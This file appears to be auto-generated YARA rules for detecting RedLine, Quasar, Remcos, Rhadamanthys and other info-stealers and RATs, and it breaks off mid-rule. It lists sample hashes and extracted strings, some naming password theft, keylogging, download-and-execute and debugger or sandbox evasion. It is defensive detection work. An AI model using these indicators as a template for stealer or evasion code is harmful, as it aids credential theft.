rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a_77 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5a14e958.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b25fef3e7d59d388afc7570c4f20df18b33bd0c09b688f5712fc3cab29338efc"
      hash2 = "5a14e9589b97d29fd97f25d0a2abc608131e3148382439b692232ffab2cf590a"
   strings:
      $s1 = "This will attempt to enable System Protection. You may need administrator privileges. Continue?" fullword wide /* score: '23.00'*/
      $s2 = "https://github.com" fullword wide /* score: '21.00'*/
      $s3 = "GetSystemProtectionStatus" fullword ascii /* score: '19.00'*/
      $s4 = "Failed to enable System Protection. Please check your administrator privileges." fullword wide /* score: '17.00'*/
      $s5 = "chkSystemProtection" fullword wide /* score: '14.00'*/
      $s6 = "IsSystemProtectionEnabled" fullword ascii /* score: '14.00'*/
      $s7 = "lblSystemProtectionStatus" fullword wide /* score: '14.00'*/
      $s8 = "btnEnableSystemProtection_Click" fullword ascii /* score: '14.00'*/
      $s9 = "grpSystemProtection" fullword wide /* score: '14.00'*/
      $s10 = "btnEnableSystemProtection" fullword wide /* score: '14.00'*/
      $s11 = "SELECT * FROM SystemRestoreConfig" fullword wide /* score: '14.00'*/
      $s12 = "Failed to create restore point. Please ensure you have administrator privileges." fullword wide /* score: '14.00'*/
      $s13 = "Failed to delete restore point. You may need administrator privileges." fullword wide /* score: '14.00'*/
      $s14 = "GetLastSystemScan" fullword ascii /* score: '13.00'*/
      $s15 = "GetSystemRestorePointSize" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__1c933dd44902e01b2ff610e71216aeb0_imphash__RustyStealer_signature__93c80fcbce9099826de256857f10effe__78 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_1c933dd44902e01b2ff610e71216aeb0(imphash).exe, RustyStealer(signature)_93c80fcbce9099826de256857f10effe(imphash).exe, RustyStealer(signature)_a8ebd0d0bf42e700555831b3ceed18e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ec0249a82e80a8856f4d50b537075f67f88a392ce20bb5fbaa18f0f069d91cd9"
      hash2 = "639eab0b1c0c93352fbe6a18a1b06f6d5fb16e14579d14637cd199868b343d6f"
      hash3 = "cdc73afb92617d9e2e0b6f2f22587f5f57316250a25b7bb8477a80628703e7b7"
   strings:
      $s1 = "StreamRef::drop; mutex poisoned" fullword ascii /* score: '27.00'*/
      $s2 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '23.00'*/
      $s3 = "assertion failed: head.len() + tail.len() <= 8" fullword ascii /* score: '19.00'*/
      $s4 = "a spawned task panicked and the runtime is configured to shut down on unhandled panic" fullword ascii /* score: '18.00'*/
      $s5 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '17.00'*/
      $s6 = "504948474645444342414039383736" wide /* score: '17.00'*/ /* hex encoded string 'PIHGFEDCBA@9876' */
      $s7 = "uri host is valid header value" fullword ascii /* score: '16.00'*/
      $s8 = "has_authority means set_password shouldn't fail" fullword ascii /* score: '15.00'*/
      $s9 = "acceptaccept-charsetaccept-encodingaccept-languageaccept-rangesaccess-control-allow-credentialsaccess-control-allow-headersacces" ascii /* score: '14.00'*/
      $s10 = "connection error sent by user: " fullword ascii /* score: '13.00'*/
      $s11 = "InvalidHeaderNameinvalid HTTP header name" fullword ascii /* score: '12.00'*/
      $s12 = "chunk not fully encoded" fullword ascii /* score: '11.00'*/
      $s13 = "ersaccess-control-request-methodageallowalt-svcauthorizationcache-controlcache-statuscdn-cache-controlconnectioncontent-disposit" ascii /* score: '11.00'*/
      $s14 = "URI missing scheme and authoritypoll_reset after send_response is illegalsend_ping before received previous pongsending SETTINGS" ascii /* score: '10.00'*/
      $s15 = "assertion failed: self.ids.insert(id, index).is_none()" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__97e5a31c945b50f9f6676688768eef5e_imphash__PureLogsStealer_signature__97e5a31c945b50f9f6676688768_79 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash).exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_52498820.exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_d096e8bd.exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_f2be0244.exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_f507b019.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17827b50808e9db7bfa7e43f7d1ce10b7a5b0920c78bd21824615980b23c2f65"
      hash2 = "5249882063c9eefc16d3dcf0f00ecc6a52a4e47e4c01cd044d8678b7c32bb61d"
      hash3 = "d096e8bd91561e5192b5323aaec30ad22e6026f2fbf9e4cedfd440e32d41143e"
      hash4 = "f2be02443042481af515df1eabaf394ed00cb1a2a453ff66e92aed375ea49443"
      hash5 = "f507b0190897d8cfd7d49f0e5200a25ed38d11d1c8f97f48e9b5a780cf0ae514"
   strings:
      $x1 = "C:\\Windows\\System32\\*.dll" fullword ascii /* score: '34.00'*/
      $s2 = "C:\\Temp\\UpdateCache\\cache.tmp" fullword ascii /* score: '23.00'*/
      $s3 = "procmon.exe" fullword ascii /* score: '22.00'*/
      $s4 = "fiddler.exe" fullword ascii /* score: '22.00'*/
      $s5 = "wireshark.exe" fullword ascii /* score: '22.00'*/
      $s6 = "C:\\Windows\\Temp\\config.ini" fullword ascii /* score: '20.00'*/
      $s7 = "C:\\Temp\\UpdateCache" fullword ascii /* score: '16.00'*/
      $s8 = "GNU C17 14.2.0 -march=nocona -msahf -mtune=generic -g -g -g -O2 -O2 -O2 -fbuilding-libgcc -fno-stack-protector" fullword ascii /* score: '12.00'*/
      $s9 = "OLLYDBG" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.50'*/
      $s10 = "SANDBOX" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.50'*/
      $s11 = "R:\\winlibs_staging_ucrt64\\gcc-14.2.0\\build_mingw\\x86_64-w64-mingw32\\libgcc" fullword ascii /* score: '10.00'*/
      $s12 = "X86_TUNE_MISALIGNED_MOVE_STRING_PRO_EPILOGUES" fullword ascii /* score: '9.00'*/
      $s13 = "WinDbgFrameClass" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s14 = "mainret" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "97e5a31c945b50f9f6676688768eef5e" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__844e4c46_RedLineStealer_signature__f34d5f2d4577ed6d9cee_80 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_844e4c46.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_97d897fb.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9fd0eaf7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "844e4c466954278d395f6e8a14f0dce60052f683ea921e147fc756abba4c82a5"
      hash2 = "97d897fb3dfb4958562a07474e634c6465b4bc077df3180654c4f6fb04011969"
      hash3 = "9fd0eaf75124db45051e5c3b0561b3e8c80af9459fcddf09289698b4acc42096"
   strings:
      $s1 = "DownloadAndExecuteUpdate" fullword ascii /* score: '22.00'*/
      $s2 = "get_encrypted_key" fullword ascii /* score: '17.00'*/
      $s3 = "<encrypted_key>k__BackingField" fullword ascii /* score: '12.00'*/
      $s4 = "set_encrypted_key" fullword ascii /* score: '12.00'*/
      $s5 = "ChromeGetRoamingName" fullword ascii /* score: '12.00'*/
      $s6 = "BCRYPT_INIT_AUTH_MODE_INFO_VERSION" fullword ascii /* score: '10.00'*/
      $s7 = "DownloadUpdate" fullword ascii /* score: '10.00'*/
      $s8 = "ChromeGetName" fullword ascii /* score: '9.00'*/
      $s9 = "RecordHeaderField" fullword ascii /* score: '9.00'*/
      $s10 = "ChromeGetLocalName" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 900KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__12c3d365_RemcosRAT_signature__4b87c9e6_RemcosRAT_signature__4cb48bf0_81 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_12c3d365.vbs, RemcosRAT(signature)_4b87c9e6.js, RemcosRAT(signature)_4cb48bf0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12c3d365008814d16e18a630f7732a6325d9efd9d3cc61508aa78c34e43f4430"
      hash2 = "4b87c9e69b5afb110449461aa7b3b03d3bf46f28752552ae9a75f90c26f413a9"
      hash3 = "4cb48bf097a05911e6942942b97fe14bf07e6caeafe179687e38c70cbc8887e7"
   strings:
      $s1 = "AAAAAAAAAAAA4" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s2 = "b3VuZENvbnRlbnRSZWN0AAAAR2V0VGhlbWVQYXJ0U2l6ZQAAAABHZXRUaGVtZVRleHRFeHRlbnQAAEdldFRoZW1lVGV4dE1ldHJpY3MAR2V0VGhlbWVCYWNrZ3JvdW5k" ascii /* base64 encoded string 'oundContentRect   GetThemePartSize    GetThemeTextExtent  GetThemeTextMetrics GetThemeBackground' */ /* score: '21.00'*/
      $s3 = "AAB1eHRoZW1lLmRsbABPcGVuVGhlbWVEYXRhAAAAQ2xvc2VUaGVtZURhdGEAAERyYXdUaGVtZUJhY2tncm91bmQARHJhd1RoZW1lVGV4dAAAAEdldFRoZW1lQmFja2dy" ascii /* base64 encoded string '  uxtheme.dll OpenThemeData   CloseThemeData  DrawThemeBackground DrawThemeText   GetThemeBackgr' */ /* score: '21.00'*/
      $s4 = "AABHZXRUaGVtZVN5c0NvbG9yQnJ1c2gAAABHZXRUaGVtZVN5c0Jvb2wAR2V0VGhlbWVTeXNTaXplAEdldFRoZW1lU3lzRm9udABHZXRUaGVtZVN5c1N0cmluZwAAAEdl" ascii /* base64 encoded string '  GetThemeSysColorBrush   GetThemeSysBool GetThemeSysSize GetThemeSysFont GetThemeSysString   Ge' */ /* score: '21.00'*/
      $s5 = "bG9nVGV4dHVyZUVuYWJsZWQAR2V0VGhlbWVBcHBQcm9wZXJ0aWVzAAAAU2V0VGhlbWVBcHBQcm9wZXJ0aWVzAAAAR2V0Q3VycmVudFRoZW1lTmFtZQBHZXRUaGVtZURv" ascii /* base64 encoded string 'logTextureEnabled GetThemeAppProperties   SetThemeAppProperties   GetCurrentThemeName GetThemeDo' */ /* score: '21.00'*/
      $s6 = "UmVnaW9uAAAAAEhpdFRlc3RUaGVtZUJhY2tncm91bmQAAERyYXdUaGVtZUVkZ2UAAABEcmF3VGhlbWVJY29uAAAASXNUaGVtZVBhcnREZWZpbmVkAABJc1RoZW1lQmFj" ascii /* base64 encoded string 'Region    HitTestThemeBackground  DrawThemeEdge   DrawThemeIcon   IsThemePartDefined  IsThemeBac' */ /* score: '21.00'*/
      $s7 = "dFRoZW1lU3lzSW50AABJc1RoZW1lQWN0aXZlAAAASXNBcHBUaGVtZWQAR2V0V2luZG93VGhlbWUAAEVuYWJsZVRoZW1lRGlhbG9nVGV4dHVyZQAAAABJc1RoZW1lRGlh" ascii /* base64 encoded string 'tThemeSysInt  IsThemeActive   IsAppThemed GetWindowTheme  EnableThemeDialogTexture    IsThemeDia' */ /* score: '21.00'*/
      $s8 = "cwBHZXRUaGVtZUludExpc3QAR2V0VGhlbWVQcm9wZXJ0eU9yaWdpbgAAU2V0V2luZG93VGhlbWUAAEdldFRoZW1lRmlsZW5hbWUAAAAAR2V0VGhlbWVTeXNDb2xvcgAA" ascii /* base64 encoded string 's GetThemeIntList GetThemePropertyOrigin  SetWindowTheme  GetThemeFilename    GetThemeSysColor  ' */ /* score: '21.00'*/
      $s9 = "dFRoZW1lSW50AEdldFRoZW1lRW51bVZhbHVlAAAAR2V0VGhlbWVQb3NpdGlvbgAAAABHZXRUaGVtZUZvbnQAAAAAR2V0VGhlbWVSZWN0AAAAAEdldFRoZW1lTWFyZ2lu" ascii /* base64 encoded string 'tThemeInt GetThemeEnumValue   GetThemePosition    GetThemeFont    GetThemeRect    GetThemeMargin' */ /* score: '21.00'*/
      $s10 = "a2dyb3VuZFBhcnRpYWxseVRyYW5zcGFyZW50AAAAR2V0VGhlbWVDb2xvcgAAAEdldFRoZW1lTWV0cmljAABHZXRUaGVtZVN0cmluZwAAR2V0VGhlbWVCb29sAAAAAEdl" ascii /* base64 encoded string 'kgroundPartiallyTransparent   GetThemeColor   GetThemeMetric  GetThemeString  GetThemeBool    Ge' */ /* score: '21.00'*/
      $s11 = "cAAAAAAAAAAAA" ascii /* base64 encoded string 'p        ' */ /* score: '20.00'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                   ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                         ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                         ' */ /* score: '16.50'*/
      $s15 = "AAAAAABAAAA" ascii /* base64 encoded string '     @  ' */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x704f or uint16(0) == 0x6176 ) and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__04e680c3_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_82 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04e680c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "04e680c37b3e4dea85505d8b785912f9a9ad3c7bbfc440e1f1654fd06510bc3c"
      hash2 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash3 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash4 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash5 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash6 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash7 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash8 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
      hash9 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $s1 = "get_PotentiallyVulnerablePasswords" fullword ascii /* score: '26.00'*/
      $s2 = "GetKeyloggerLogsDirectory" fullword ascii /* score: '22.00'*/
      $s3 = "GetKeyloggerLogsDirectoryResponse" fullword ascii /* score: '22.00'*/
      $s4 = "<PotentiallyVulnerablePasswords>k__BackingField" fullword ascii /* score: '21.00'*/
      $s5 = "set_PotentiallyVulnerablePasswords" fullword ascii /* score: '21.00'*/
      $s6 = "get_DismissedBreachAlertsByLoginGuid" fullword ascii /* score: '20.00'*/
      $s7 = "<Execute>b__3_0" fullword ascii /* score: '18.00'*/
      $s8 = "<Execute>b__3_1" fullword ascii /* score: '18.00'*/
      $s9 = "get_PasswordField" fullword ascii /* score: '17.00'*/
      $s10 = "get_TimePasswordChanged" fullword ascii /* score: '17.00'*/
      $s11 = "GetPasswordsResponse" fullword ascii /* score: '17.00'*/
      $s12 = "GetPasswords" fullword ascii /* score: '17.00'*/
      $s13 = "Gma.System.MouseKeyHook" fullword ascii /* score: '17.00'*/
      $s14 = "<EncryptedPassword>k__BackingField" fullword ascii /* score: '17.00'*/
      $s15 = "get_EncryptedUsername" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__83 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash2 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash3 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash4 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash5 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash6 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash7 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash8 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash9 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
   strings:
      $s1 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '21.00'*/
      $s2 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s3 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '18.00'*/
      $s4 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '17.00'*/
      $s5 = "runtime._RtlGetNtVersionNumbers" fullword ascii /* score: '15.00'*/
      $s6 = "runtime/internal/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s7 = "runtime/internal/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s8 = "runtime/internal/atomic.(*Int64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s9 = "runtime/internal/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s10 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s11 = " preemptoff= s.elemsize= s.sweepgen= span.limit= span.state= sysmonwait= wbuf1=<nil> wbuf2=<nil>) p->status=, cons/mark -byte li" ascii /* score: '13.00'*/
      $s12 = "syscall.getprocaddress.abi0" fullword ascii /* score: '11.00'*/
      $s13 = "syscall.procRtlGetNtVersionNumbers" fullword ascii /* score: '11.00'*/
      $s14 = "readvarint" fullword ascii /* score: '11.00'*/
      $s15 = "runtime/internal/atomic.(*Uint8).And" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__441fa51c_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_84 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_441fa51c.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a2d4706.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_97114161.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "441fa51c88aaef7b1d6032aeef7e569ba201417b44ae26731904ad0c25b65d63"
      hash2 = "4a2d47065b28a755f31dc05f5eb6e031946eef7c8daf4cf84d356d1146020633"
      hash3 = "97114161b75eb40dac1d98f55bebed4ae04dbb6c6146763cd0574d74a34700d1"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<Serilog.Parsing.MessageTemplateToken>.GetEnumerator" fullword ascii /* score: '30.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<Serilog.Parsing.MessageTemplateToken>.get_Current" fullword ascii /* score: '30.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<Serilog.Parsing.MessageTemplateToken>.Current" fullword ascii /* score: '30.00'*/
      $s4 = "System.Collections.Generic.IEnumerator<Serilog.Events.LogEventProperty>.get_Current" fullword ascii /* score: '24.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<Serilog.Events.LogEventProperty>.GetEnumerator" fullword ascii /* score: '24.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Serilog.Events.LogEventProperty>.Current" fullword ascii /* score: '19.00'*/
      $s7 = "loggerConfiguration" fullword wide /* score: '17.00'*/
      $s8 = "configureLogger" fullword wide /* score: '17.00'*/
      $s9 = "<>3__messageTemplate" fullword ascii /* score: '16.00'*/
      $s10 = "Command failed: " fullword wide /* score: '15.00'*/
      $s11 = "IUse named arguments with this method to guarantee forwards-compatibility." fullword ascii /* score: '12.00'*/
      $s12 = "outputTemplate" fullword wide /* score: '11.00'*/
      $s13 = "Message template is malformed: {0}" fullword wide /* score: '11.00'*/
      $s14 = "pathTemplate" fullword wide /* score: '11.00'*/
      $s15 = ".NET Framework 4.6A" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5__85 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
   strings:
      $s1 = "runtime.mapassign_fast32ptr" fullword ascii /* score: '13.00'*/
      $s2 = "main.ntdll" fullword ascii /* score: '12.00'*/
      $s3 = "main.kernel32" fullword ascii /* score: '12.00'*/
      $s4 = "This program can only be run on processors with MMX support." fullword ascii /* score: '11.00'*/
      $s5 = "*syscall.ProcessInformation" fullword ascii /* score: '11.00'*/
      $s6 = "sync/atomic.CompareAndSwapInt32" fullword ascii /* score: '11.00'*/
      $s7 = "sync/atomic.CompareAndSwapUint64" fullword ascii /* score: '11.00'*/
      $s8 = "runtime.panicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.makeslice64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.uint32tofloat64" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.slowdodiv" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.int64mod" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.int64div" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.panicExtendSliceB" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.float64touint64" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__93c80fcbce9099826de256857f10effe_imphash__RustyStealer_signature__a8ebd0d0bf42e700555831b3ceed18e4__86 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_93c80fcbce9099826de256857f10effe(imphash).exe, RustyStealer(signature)_a8ebd0d0bf42e700555831b3ceed18e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "639eab0b1c0c93352fbe6a18a1b06f6d5fb16e14579d14637cd199868b343d6f"
      hash2 = "cdc73afb92617d9e2e0b6f2f22587f5f57316250a25b7bb8477a80628703e7b7"
   strings:
      $s1 = "acceptaccept-charsetaccept-encodingaccept-languageaccept-rangesaccess-control-allow-credentialsaccess-control-allow-headersacces" ascii /* score: '27.00'*/
      $s2 = "ocolsec-websocket-versionserverset-cookiestrict-transport-securitytetrailertransfer-encodinguser-agentupgradeupgrade-insecure-re" ascii /* score: '23.00'*/
      $s3 = "incelast-modifiedlinklocationmax-forwardsoriginpragmaproxy-authenticateproxy-authorizationpublic-key-pinspublic-key-pins-report-" ascii /* score: '17.00'*/
      $s4 = "FFFFFFFFI" fullword ascii /* reversed goodware string 'IFFFFFFFF' */ /* score: '16.50'*/
      $s5 = "attempted to finish a map with a partial entry" fullword ascii /* score: '13.00'*/
      $s6 = "attempted to begin a new map entry without completing the previous one" fullword ascii /* score: '13.00'*/
      $s7 = "internal error: entered unreachable code: HeaderMap::into_iter yielded None first" fullword ascii /* score: '12.00'*/
      $s8 = "ort-onlycontent-typecookiedntdateetagexpectexpiresforwardedfromhostif-matchif-modified-sinceif-none-matchif-rangeif-unmodified-s" ascii /* score: '12.00'*/
      $s9 = "questsvaryviawarningwww-authenticatex-content-type-optionsx-dns-prefetch-controlx-frame-optionsx-xss-protection" fullword ascii /* score: '11.00'*/
      $s10 = "assertion failed: d.mant + d.plus < (1 << 61)" fullword ascii /* score: '11.00'*/
      $s11 = "FramedRead::poll_next" fullword ascii /* score: '10.00'*/
      $s12 = "could not resolve to any addresses" fullword ascii /* score: '9.00'*/
      $s13 = "filled must not become larger than initialized" fullword ascii /* score: '9.00'*/
      $s14 = "failed to fill whole buffer" fullword ascii /* score: '9.00'*/
      $s15 = "updating connection flow" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5__87 {
   meta:
